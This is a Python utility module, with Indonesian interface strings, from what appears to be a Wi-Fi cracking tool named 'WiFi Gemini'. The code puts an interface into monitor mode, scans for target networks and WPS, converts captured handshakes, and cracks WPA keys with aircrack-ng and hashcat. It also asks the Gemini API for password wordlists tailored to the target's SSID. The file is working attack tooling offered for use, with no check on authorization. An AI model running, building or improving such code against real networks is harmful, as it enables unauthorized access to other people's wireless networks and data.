# File: common_utils.py
import subprocess, re, requests, json, time, os, sys, csv

def run_command(command, timeout=None, stream_output=False):
    if stream_output:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8', errors='ignore')
        stdout_lines = []
        for line in iter(process.stdout.readline, ''): print(line.strip()); stdout_lines.append(line)
        process.stdout.close(); return_code = process.wait()
        return ("\n".join(stdout_lines), None if return_code == 0 else "Proses selesai dengan error")
    try:
        result = subprocess.run(command, check=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', timeout=timeout)
        return (result.stdout, result.stderr)
    except subprocess.CalledProcessError as e: return (e.stdout, e.stderr)
    except (FileNotFoundError, subprocess.TimeoutExpired) as e: return (None, str(e))

def check_root(ui):
    if os.geteuid() != 0: ui.error("Perlu hak akses root."); sys.exit(1)

def enable_monitor_mode(ui, interface, aggressive=False):
    monitor_interface_name = f'{interface}mon'
    ui.info(f"Mengaktifkan monitor mode pada {interface}...")
    if aggressive:
        ui.info("Menggunakan metode agresif (mematikan proses lain)...")
        run_command(['airmon-ng', 'check', 'kill'])
        _, err = run_command(['airmon-ng', 'start', interface])
        if not err: ui.success(f"Mode monitor aktif di {monitor_interface_name}."); return monitor_interface_name
        else: ui.error("Metode agresif gagal."); return None
    else:
        ui.info("Menggunakan metode standar (menjaga koneksi lain tetap aktif)...")
        try:
            run_command(['ip', 'link', 'set', interface, 'down']); run_command(['iwconfig', interface, 'mode', 'monitor']); run_command(['ip', 'link', 'set', interface, 'up']); time.sleep(1)
            check, _ = run_command(['iwconfig', interface])
            if check and 'Mode:Monitor' in check: ui.success(f"Mode monitor aktif di {interface}."); return interface
            raise RuntimeError("Gagal verifikasi mode monitor.")
        except Exception: ui.error("Metode standar gagal."); return None

def disable_monitor_mode(ui, monitor_interface):
    if not monitor_interface: return
    ui.info(f"Menonaktifkan monitor mode di {monitor_interface}...");
    try:
        run_command(['airmon-ng', 'stop', monitor_interface])
        ui.info("Merestart NetworkManager..."); run_command(['systemctl', 'start', 'NetworkManager.service']); ui.success("Layanan jaringan dipulihkan.")
    except Exception as e: ui.error(f"Gagal menonaktifkan mode monitor: {e}")

def scan_networks(ui, monitor_interface):
    ui.start_spinner("Memindai jaringan (airodump-ng)..."); scan_prefix = "scan_result"
    for f in os.listdir('.'):
        if f.startswith(scan_prefix): os.remove(f)
    p = subprocess.Popen(['airodump-ng', '--write', scan_prefix, '--output-format', 'csv', monitor_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(15); p.terminate(); p.wait()
    ui.stop_spinner(success=True, new_text="Pemindaian airodump-ng Selesai.")
    networks = [];
    try:
        with open(f"{scan_prefix}-01.csv", 'r') as f:
            rows = csv.reader(f); next(r for r in rows if r and r[0].strip() == 'BSSID')
            for r in rows:
                if not r or len(r) < 14 or r[0].strip() == 'Station MAC': break
                b, c, e = r[0].strip(), r[3].strip(), r[13].strip()
                if e and b: networks.append((e, b, c))
    except: pass
    finally:
        for f in os.listdir('.'):
            if f.startswith(scan_prefix): os.remove(f)
    ui.start_spinner("Memindai jaringan dengan WPS aktif (wash)..."); wps_networks = set()
    wash_cmd = ['wash', '-i', monitor_interface, '-C', '-s']; wash_output, _ = run_command(wash_cmd, timeout=15)
    ui.stop_spinner(success=True, new_text="Pemindaian WPS Selesai.")
    if wash_output:
        for line in wash_output.split('\n'):
            match = re.search(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line)
            if match: wps_networks.add(match.group(0))
    if not networks: ui.error("Tidak ada jaringan yang terdeteksi."); return []
    ui.success("Hasil Pemindaian Gabungan:"); unique_networks = sorted(list(set(networks))); networks_with_wps = []
    for net in unique_networks:
        bssid = net[1]; wps_enabled = bssid in wps_networks
        networks_with_wps.append((net, wps_enabled))
    ui.table(networks_with_wps); return unique_networks

def select_target(ui, networks):
    if not networks: return None
    try: sys.stdin = open('/dev/tty')
    except: return None
    while True:
        try:
            choice_str = ui.prompt("Pilih target (nomor): ").strip()
            if not choice_str: continue
            choice = int(choice_str) - 1
            if 0 <= choice < len(networks): return networks[choice]
            else: ui.error("Pilihan tidak valid.")
        except (ValueError, EOFError, KeyboardInterrupt): ui.error("\nInput dibatalkan."); return None

def generate_report(ui, config, target_info, results):
    report_file = config.get('Paths', 'report_file'); ui.header("MEMBUAT LAPORAN AKHIR")
    try:
        with open(report_file, 'w') as f:
            f.write("=== Laporan Pengujian Keamanan Wi-Fi (WiFi Gemini) ===\n\n"); f.write(f"Tanggal: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"SSID: {target_info[0]}\nBSSID: {target_info[1]}\nChannel: {target_info[2]}\n\n")
            for i, (method, result) in enumerate(results): f.write(f"=== Hasil Serangan {i+1}: {method} ===\n"); f.write(result + "\n\n")
        ui.success(f"Laporan berhasil disimpan di {os.path.abspath(report_file)}")
    except IOError as e: ui.error(f"Gagal menulis laporan: {e}")

def load_sessions(config):
    session_file = config.get('Filenames', 'session_file')
    if os.path.exists(session_file):
        try:
            with open(session_file, 'r') as f: return json.load(f)
        except (json.JSONDecodeError, IOError): return {}
    return {}

def save_session(ui, config, session_data):
    session_file = config.get('Filenames', 'session_file'); sessions = load_sessions(config)
    sessions[session_data['bssid']] = session_data
    with open(session_file, 'w') as f: json.dump(sessions, f, indent=4)
    ui.success(f"Sesi untuk target {session_data['ssid']} telah disimpan.")

def clear_session(ui, config, bssid):
    session_file = config.get('Filenames', 'session_file'); sessions = load_sessions(config)
    if bssid in sessions:
        del sessions[bssid]
        with open(session_file, 'w') as f: json.dump(sessions, f, indent=4)
        ui.info(f"Sesi untuk {bssid} telah dibersihkan.")

def generate_gemini_wordlist(ui, config, target_info):
    ui.header("Menghubungi Gemini AI untuk Membuat Wordlist Khusus");
    gemini_api_key = os.getenv('GEMINI_API_KEY')
    if not gemini_api_key: ui.error("Kunci API Gemini tidak ditemukan."); return None
    ssid_name = target_info[0]; gemini_model = config.get('AI', 'gemini_model'); generated_wordlist_file = config.get('Filenames', 'gemini_wordlist')
    prompt = f"""Anda adalah generator wordlist. HANYA berikan daftar kata, satu kata per baris. JANGAN tambahkan penjelasan. SSID Target: "{ssid_name}". Buat daftar berisi sekitar 100 calon password berdasarkan SSID tersebut, termasuk variasi angka, huruf besar/kecil, dan simbol. Sekarang, buatkan wordlist untuk SSID "{ssid_name}":""";
    headers = {'Content-Type': 'application/json'}; data = {"contents": [{"parts":[{"text": prompt}]}]}; api_url = f"https://generativelanguage.googleapis.com/v1beta/models/{gemini_model}:generateContent?key={gemini_api_key}";
    ui.start_spinner(f"Meminta wordlist untuk SSID '{ssid_name}'...")
    try:
        response = requests.post(api_url, headers=headers, data=json.dumps(data), timeout=45); response.raise_for_status()
        raw_text = response.json()['candidates'][0]['content']['parts'][0]['text']; passwords = [line.strip() for line in raw_text.strip().split('\n') if line.strip()]
        if not passwords: ui.stop_spinner(success=False, new_text="Gemini tidak menghasilkan wordlist."); return None
        with open(generated_wordlist_file, 'w') as f: f.write('\n'.join(passwords))
        file_path = os.path.abspath(generated_wordlist_file); ui.stop_spinner(success=True, new_text=f"Gemini membuat wordlist dengan {len(passwords)} kata."); ui.info(f"Disimpan di: {file_path}"); return file_path
    except Exception as e: ui.stop_spinner(success=False, new_text=f"Gagal berkomunikasi dengan Gemini."); ui.error(str(e)); return None

def convert_cap_to_hashcat(ui, config, cap_file):
    hashcat_hash_file = config.get('Filenames', 'hashcat_hash'); ui.info(f"Mengonversi {cap_file} ke format hashcat..."); _, err = run_command(['which', 'hcxpcapngtool'])
    if err: ui.error("hcxpcapngtool tidak ditemukan."); return None
    hash_file_path = os.path.abspath(hashcat_hash_file); _, conversion_error = run_command(['hcxpcapngtool', '-o', hash_file_path, cap_file])
    if os.path.exists(hash_file_path) and os.path.getsize(hash_file_path) > 0: ui.success(f"Konversi berhasil."); return hash_file_path
    else:
        ui.error("Gagal mengonversi file .cap.")
        if conversion_error: ui.error(f"   Detail Error: {conversion_error.strip()}")
        else: ui.error("   File .cap mungkin tidak berisi handshake/pmkid yang dapat diproses.")
        return None

def crack_with_aircrack(ui, config, target_info, capture_file, wordlist_path):
    session_data = {"ssid": target_info[0], "bssid": target_info[1], "type": "aircrack", "capture_file": capture_file, "wordlist": wordlist_path}
    ui.header(f"MENYERANG DENGAN AIRCRACK (WORDLIST: {os.path.basename(wordlist_path)})");
    if not os.path.exists(wordlist_path): ui.error(f"Wordlist tidak ditemukan: {wordlist_path}"); return f"Gagal: wordlist tidak ditemukan."
    cmd = ['aircrack-ng', '-w', wordlist_path, capture_file]
    ui.info("Untuk menyimpan sesi dan berhenti, tekan Ctrl+C...")
    try:
        ui.start_spinner("Menjalankan aircrack-ng...")
        result, _ = run_command(cmd)
        ui.stop_spinner(True, "Proses Aircrack Selesai.")
        return result if result else "Proses aircrack-ng gagal."
    except KeyboardInterrupt:
        ui.stop_spinner(False, "Serangan Aircrack dihentikan oleh pengguna.")
        choice = ui.prompt("Simpan sesi cracking ini untuk dilanjutkan nanti? (y/n): ").lower()
        if choice == 'y': save_session(ui, config, session_data)
        sys.exit(0)

def crack_with_hashcat(ui, config, target_info, hash_file, wordlist_path):
    session_name = f"{target_info[0].replace(' ', '')}_{target_info[1].replace(':', '')[:5]}"
    session_data = {"ssid": target_info[0], "bssid": target_info[1], "type": "hashcat", "hash_file": hash_file, "wordlist": wordlist_path, "session_name": session_name}
    ui.header(f"MENYERANG DENGAN HASHCAT + ATURAN (SESI: {session_name})");
    if not run_command(['which', 'hashcat'])[0]: ui.error("hashcat tidak ditemukan."); return "Gagal."
    hashcat_rule_file = config.get('Paths', 'hashcat_rule_file')
    if not os.path.exists(hashcat_rule_file): ui.error(f"File aturan tidak ditemukan: {hashcat_rule_file}"); return "Gagal."
    hashcat_potfile = config.get('Filenames', 'hashcat_potfile')
    cmd = ['hashcat', '-m', '22000', '-a', '0', '--potfile-path', hashcat_potfile, f'--session={session_name}', hash_file, wordlist_path, '-r', hashcat_rule_file]
    ui.info("Untuk menyimpan sesi dan berhenti, tekan Ctrl+C...")
    try:
        ui.start_spinner("Menjalankan hashcat (bisa lama)..."); run_command(cmd)
        ui.stop_spinner(True, "Proses Hashcat Selesai.")
    except KeyboardInterrupt:
        ui.stop_spinner(False, "Serangan Hashcat dihentikan oleh pengguna.")
        choice = ui.prompt("Simpan sesi cracking ini untuk dilanjutkan nanti? (y/n): ").lower()
        if choice == 'y': save_session(ui, config, session_data)
        sys.exit(0)
    ui.info("Memeriksa hasil dari hashcat..."); result, _ = run_command(['hashcat', '-m', '22000', '--show', f'--session={session_name}', hash_file])
    if result and ":" in result: return f"KEY FOUND! (Hashcat)\n{result}"
    return "Password tidak ditemukan dengan metode Hashcat + Aturan."